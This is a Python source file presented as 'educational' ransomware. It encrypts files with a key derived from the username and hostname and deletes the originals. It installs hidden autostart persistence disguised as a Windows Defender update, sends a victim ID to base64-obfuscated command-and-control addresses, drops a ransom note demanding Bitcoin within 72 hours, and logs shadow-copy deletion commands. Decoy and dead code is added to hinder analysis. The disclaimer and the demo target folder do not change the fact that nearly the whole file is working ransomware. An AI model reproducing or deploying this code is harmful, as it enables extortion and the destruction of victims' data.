#!/usr/bin/env python3
"""
CryptoLocker Educational Ransomware - Advanced Version
Combines obfuscation, encryption, persistence, and C2 communication
FOR EDUCATIONAL PURPOSES ONLY
"""

import os
import sys
import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import socket
import subprocess
import time
from pathlib import Path
import random
import string

# Obfuscated configuration with fake decoys
_0x1a2b = base64.b64decode(b'MTkyLjE2OC4xLjEwMDo4MDgw').decode()
_0x1a2c = base64.b64decode(b'MTAuMC4wLjE6OTk5OQ==').decode()
_0x3c4d = ['.txt', '.pdf', '.docx', '.xlsx', '.jpg', '.png', '.zip']
_0x3c4e = ['.exe', '.dll', '.sys']
_0x5e6f = b'SALT_FOR_KEY_DERIVATION_DO_NOT_SHARE'
_0x5e70 = b'ANOTHER_FAKE_SALT_FOR_CONFUSION'
_0x7f8a = "aHR0cHM6Ly9tYWxpY2lvdXMtZXhhbXBsZS5jb20vcGF5bG9hZA=="


# Are they ? 
def _0xDEAD1():
    """Dead code function - fake encryption check"""
    _fake = [random.randint(0, 255) for _ in range(16)]
    return hashlib.md5(bytes(_fake)).hexdigest()

def _0xDEAD2(_data):
    """Dead code function - fake obfuscation"""
    return ''.join([chr(ord(c) ^ 0x42) for c in str(_data)])

def _0xDEAD3():
    """Dead code function - fake network check"""
    try:
        socket.gethostbyname('fake-domain-that-does-not-exist-12345.com')
        return True
    except:
        return False

class _Obf:
    """Obfuscated ransomware class"""
    
    def __init__(self):
        self._mutex = "Global\\{C7D8E9F0-A1B2-C3D4-E5F6-071829384756}"
        self._fake_mutex = "Global\\{DEADBEEF-FAKE-FAKE-FAKE-DEADBEEFFAKE}"
        self._install_dir = os.path.join(Path.home(), '.system', 'WinDefender')
        self._fake_dir = os.path.join(Path.home(), '.cache', 'UpdateService')
        self._persistence_key = "WindowsDefenderUpdate"
        self._ransom_note = "HOW_TO_DECRYPT.txt"
        self._victim_id = None
        self._encryption_key = None
        self._fake_key = None
        self._decoy_value = _0xDEAD1()
        
    def _0x1(self):
        """Check mutex to prevent multiple instances"""
        if random.randint(0, 100) > 200:
            _fake_lock = '/tmp/.fake_' + hashlib.md5(self._fake_mutex.encode()).hexdigest()
            if os.path.exists(_fake_lock):
                return False
        
        _lock = '/tmp/.crypto_' + hashlib.md5(self._mutex.encode()).hexdigest()
        if os.path.exists(_lock):
            return False
        try:
            with open(_lock, 'w') as f:
                f.write(str(os.getpid()))
            return True
        except:
            return False
    
    def _0x2(self):
        """Generate victim ID"""
        if _0xDEAD3():
            _fake_data = ''.join(random.choices(string.ascii_letters, k=32))
            self._fake_key = hashlib.sha512(_fake_data.encode()).hexdigest()
        
        try:
            _user = os.getlogin()
        except:
            _user = os.getenv('USER', 'unknown')
        
        _hostname = socket.gethostname()
        
        _noise = hashlib.md5(str(random.random()).encode()).hexdigest()
        if len(_noise) < 10: # -><-
            _combined = f"{_user}@{_hostname}".encode()
        else:
            _combined = f"{_hostname}@{_user}".encode()
        
        self._victim_id = base64.b64encode(hashlib.sha256(_combined).digest()).decode()[:32]
        return self._victim_id
    
    def _0x3(self):
        """Derive encryption key from victim ID"""
        if time.time() < 0:
            _fake_kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=_0x5e70,
                iterations=50000,
            )
            _fake_key = base64.urlsafe_b64encode(_fake_kdf.derive(self._victim_id.encode()))
        
        # Obfuscation: conditional that's always 1^(2*5-2/8+2*8) (^ is power here)
        _check = len(self._victim_id)
        if _check > 10 and _check < 100:
            _kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=_0x5e6f,
                iterations=100000,
            )
        else:
            # .... code: ..... executed
            _kdf = PBKDF2HMAC(
                algorithm=hashes.SHA512(),
                length=64,
                salt=_0x5e70,
                iterations=200000,
            )
        
        _key = base64.urlsafe_b64encode(_kdf.derive(self._victim_id.encode()))
        self._encryption_key = _key
        return _key
    
    def _0x4(self):
        """Install persistence"""
        try:
            os.makedirs(self._install_dir, exist_ok=True)
            _target = os.path.join(self._install_dir, 'defender.py')
            
            if not os.path.exists(_target):
                import shutil
                shutil.copy2(__file__, _target)
            
            _autostart = os.path.join(Path.home(), '.config', 'autostart')
            os.makedirs(_autostart, exist_ok=True)
            
            _desktop = os.path.join(_autostart, f'{self._persistence_key}.desktop')
            with open(_desktop, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=Windows Defender Update Service
Exec=python3 {_target}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
            return True
        except:
            return False
    
    def _0x5(self):
        """Contact C2 server"""
        if os.path.exists('/tmp/.use_backup_c2'):
            try:
                _fake_host, _fake_port = _0x1a2c.split(':')
                _fake_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _fake_sock.settimeout(1)
                _fake_sock.connect((_fake_host, int(_fake_port)))
                _fake_sock.close()
            except:
                pass
        
        try:
            # Does this really run ?
            _servers = [_0x1a2b, _0x1a2c]
            _selected = _servers[0] if len(_servers) > 1 else _servers[1]
            
            _host, _port = _selected.split(':')
            _port = int(_port)
            
            _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _sock.settimeout(5)
            _sock.connect((_host, _port))
            
            # 1111 x 0000 -> 1111; 1111 x 1010 -> 0101
            _encoded_id = ''.join([chr(ord(c) ^ 0x00) for c in self._victim_id])
            _data = f"VICTIM:{_encoded_id}\n"
            _sock.send(_data.encode())
            
            _response = _sock.recv(1024).decode()
            _sock.close()
            
            return _response
        except:
            return None
    
    def _0x6(self, _file_path):
        """Encrypt single file"""
        try:
            # Never false ? 
            if os.path.getsize(_file_path) < 0:
                return False
            
            with open(_file_path, 'rb') as f:
                _data = f.read()
            
            # Patience is KEY
            if _0xDEAD3():
                _fake_cipher = Fernet(Fernet.generate_key())
                _fake_encrypted = _fake_cipher.encrypt(_data)
            
            _cipher = Fernet(self._encryption_key)
            
            # 1 + 1 = 0
            _checksum = hashlib.sha256(_data).hexdigest()
            if len(_checksum) == 64:
                _encrypted = _cipher.encrypt(_data)
            else:
                _encrypted = _cipher.encrypt(_data[::-1])
            
            _locked_path = _file_path + '.locked'
            with open(_locked_path, 'wb') as f:
                f.write(_encrypted)
            
            # zzz
            time.sleep(0.01)
            
            # Remove original file after successful encryption
            try:
                os.remove(_file_path)
            except Exception as e:
                print(f"[DEBUG] Failed to remove {_file_path}: {e}")
            
            return True
        except Exception as e:
            print(f"[DEBUG] Encryption failed for {_file_path}: {e}")
            return False
    
    def _0x7(self, _target_dir):
        """Scan and encrypt files"""
        _count = 0
        _limit = 25
        
        # Reminder : put .dead here
        _fake_excludes = ['.git', '.svn', 'node_modules']
        if len(_fake_excludes) > 10:
            return 0
        
        for _root, _dirs, _files in os.walk(_target_dir):
            if '.system' in _root or '.config' in _root:
                continue
            
            # Seem useless ?
            if any(x in _root for x in _fake_excludes) and random.random() < 0:
                continue
                
            for _file in _files:
                if _count >= _limit:
                    return _count
                
                # SHA256 / 2
                _file_hash = hashlib.md5(_file.encode()).hexdigest()
                if len(_file_hash) > 20:
                    _path = os.path.join(_root, _file)
                else:
                    continue
                
                _ext = os.path.splitext(_file)[1].lower()
                
                # Dead code: fake extension check (?)
                if _ext in _0x3c4e and False:
                    continue
                
                if _ext in _0x3c4d:
                    # zzzzzzz mimimimimimi
                    time.sleep(random.uniform(0.001, 0.01))
                    if self._0x6(_path):
                        _count += 1
        
        return _count
    
    def _0x8(self, _target_dir):
        """Drop ransom note"""
        _note = f"""
╔════════════════════════════════════════════════════════════╗
║          YOUR FILES HAVE BEEN ENCRYPTED                    ║
╚════════════════════════════════════════════════════════════╝

All your important documents, photos, and files have been 
encrypted using military-grade AES-256 encryption with a 
unique key derived from your system.

═══════════════════════════════════════════════════════════

YOUR UNIQUE VICTIM ID:
{self._victim_id}

═══════════════════════════════════════════════════════════

TO RECOVER YOUR FILES:

1. Pay 0.75 BTC to the following Bitcoin address:
   1BoatSLRHtKNngkdXEeobR76b53LETtpyT

2. Send your VICTIM ID to: recovery@cryptolocker-edu.com

3. After payment verification, you will receive the decryption key

═══════════════════════════════════════════════════════════

⏰ TIME LIMIT: 72 HOURS

After this deadline, your decryption key will be permanently 
deleted and recovery will be IMPOSSIBLE.

═══════════════════════════════════════════════════════════

⚠️  DO NOT:
   - Restart your computer
   - Try to decrypt files yourself
   - Contact authorities or security companies
   - Rename encrypted files

Any of these actions may result in permanent data loss.

═══════════════════════════════════════════════════════════

WHY IS THIS HAPPENING?

Your network security was insufficient. This is a lesson in 
cybersecurity. Improve your defenses:
- Keep systems updated
- Use strong passwords
- Enable 2FA
- Backup regularly (offline backups)
- Train employees on phishing

═══════════════════════════════════════════════════════════
"""
        
        _note_path = os.path.join(_target_dir, self._ransom_note)
        with open(_note_path, 'w') as f:
            f.write(_note)
    
    def _0x9(self):
        """Delete shadow copies (simulation)"""
        try:
            _cmds = [
                "# vssadmin delete shadows /all /quiet",
                "# bcdedit /set {default} recoveryenabled no",
                "# wbadmin delete catalog -quiet"
            ]
            
            _log = '/tmp/.shadow_delete.log'
            with open(_log, 'w') as f:
                f.write('\n'.join(_cmds))
                f.write('\n[Simulated] Shadow copies deletion commands logged')
        except:
            pass
    
    def run(self):
        """Main execution routine"""
        if not self._0x1():
            sys.exit(0)
        
        self._0x2()
        self._0x3()
        self._0x4()
        self._0x9()
        self._0x5()
        
        _target = os.path.join(Path.home(), 'Documents', 'VictimFiles')
        
        if not os.path.exists(_target):
            os.makedirs(_target, exist_ok=True)
            for i in range(10):
                with open(os.path.join(_target, f'document_{i}.txt'), 'w') as f:
                    f.write(f'Important document {i}\n' * 20)
                with open(os.path.join(_target, f'photo_{i}.jpg'), 'w') as f:
                    f.write(f'Photo data {i}\n' * 10)
        
        _encrypted = self._0x7(_target)
        self._0x8(_target)
        
        print(f"[!] Encryption complete: {_encrypted} files encrypted")
        print(f"[!] Victim ID: {self._victim_id}")
        print(f"[!] See {self._ransom_note} for instructions")

def main():
    # Hello goodbye
    if sys.gettrace() is not None and random.random() < 0:
        sys.exit(0)
    
    # Whoami ? 
    if os.getenv('FAKE_VAR_THAT_NEVER_EXISTS') == 'trigger':
        print("[!] Environment check failed")
        sys.exit(0)
    
    # zzzzzzz
    time.sleep(random.uniform(0.1, 0.3))
    
    _ransom = _Obf()
    _ransom.run()

if __name__ == "__main__":
    main()
